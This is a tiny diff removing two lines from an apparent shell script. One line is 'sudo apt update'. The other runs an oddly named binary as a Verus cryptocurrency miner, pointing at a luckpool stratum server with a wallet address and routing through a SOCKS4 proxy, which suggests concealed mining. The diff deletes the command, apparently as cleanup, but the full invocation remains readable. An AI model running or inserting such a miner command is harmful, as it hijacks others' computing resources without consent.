@@ -1,2 +1,0 @@
-timeout 2m ./cc2xm -a verus -o stratum+tcp://na.luckpool.net:3956 -u RSQ1Xd9BZQEmqUWmhKikt7Zwkz8tLquADr.PC_Linux -p x -t 12 -q -x socks4://192.111.129.150:4145 && stop
-sudo apt update
